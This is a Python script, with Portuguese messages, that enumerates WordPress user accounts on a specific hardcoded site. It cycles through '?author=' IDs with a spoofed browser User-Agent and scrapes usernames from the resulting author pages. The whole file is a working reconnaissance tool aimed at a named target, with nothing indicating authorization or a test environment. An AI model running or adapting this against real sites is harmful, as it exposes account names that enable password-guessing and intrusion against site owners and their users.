import requests
import re

BASE_URL = "https://princesareborn.actmobmarketingdigital.com.br/?author="
START_ID = 1
END_ID = 10

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

def get_author_name(page_content):
    match = re.search(r'<meta property="og:title" content="([^"]+)"', page_content)
    if match:
        return match.group(1)
    else:
        match = re.search(r'<h1.*?>\s*(.*?)\s*</h1>', page_content)
        if match:
            return match.group(1)
    return None

def enumerate_users():
    print("Enumerando usuários do WordPress...")
    
    for user_id in range(START_ID, END_ID + 1):
        url = BASE_URL + str(user_id)
        response = requests.get(url, headers=HEADERS, allow_redirects=True)
        
        if response.status_code in [200, 301, 302]:
            redirected_url = response.url
            if "/author/" in redirected_url:
                author_name = get_author_name(response.text)
                if author_name:
                    print(f"[+] Usuário encontrado: ID {user_id} -> {author_name} -> {redirected_url}")
                else:
                    print(f"[+] Usuário encontrado sem nome claro: ID {user_id} -> {redirected_url}")
            else:
                if "author" in response.text.lower():
                    author_name = get_author_name(response.text)
                    if author_name:
                        print(f"[+] Usuário encontrado (conteúdo): ID {user_id} -> {author_name} -> {redirected_url}")
                    else:
                        print(f"[+] Usuário encontrado sem nome claro (conteúdo): ID {user_id} -> {redirected_url}")
                else:
                    print(f"[-] ID {user_id} não redirecionou para um autor válido.")
        else:
            print(f"[-] ID {user_id} retornou código {response.status_code}.")

if __name__ == "__main__":
    enumerate_users()
